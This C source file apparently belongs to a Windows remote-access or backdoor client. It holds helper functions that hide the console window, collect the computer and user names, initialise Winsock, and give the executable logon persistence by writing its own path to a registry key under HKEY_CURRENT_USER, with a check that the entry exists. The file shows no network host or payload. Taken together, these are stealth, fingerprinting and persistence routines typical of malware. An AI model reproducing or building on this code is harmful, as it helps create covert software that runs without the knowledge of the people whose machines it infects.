#include "utils.h"
#include "common.h"
#include "config.h"
#include <stdio.h>

void HideConsoleWindow()
{
    HWND hwnd = GetConsoleWindow();
    if (hwnd)
    {
        ShowWindow(hwnd, SW_HIDE);
    }
}

void GetComputerInfo()
{
    DWORD size = sizeof(computer_name);
    GetComputerNameA(computer_name, &size);

    size = sizeof(user_name);
    GetUserNameA(user_name, &size);
}

int InitializeWinsock()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        return 0;
    }
    return 1;
}

void AddToStartup()
{
    HKEY hKey;
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_KEY_PATH, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueExA(hKey, APP_NAME, 0, REG_SZ, (BYTE *)szPath, strlen(szPath) + 1);
        RegCloseKey(hKey);
    }
}

BOOL IsInStartup()
{
    HKEY hKey;
    char szPath[MAX_PATH];
    DWORD dwSize = MAX_PATH;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_KEY_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExA(hKey, APP_NAME, NULL, NULL, (LPBYTE)szPath, &dwSize) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            char currentPath[MAX_PATH];
            GetModuleFileNameA(NULL, currentPath, MAX_PATH);
            return _stricmp(szPath, currentPath) == 0;
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}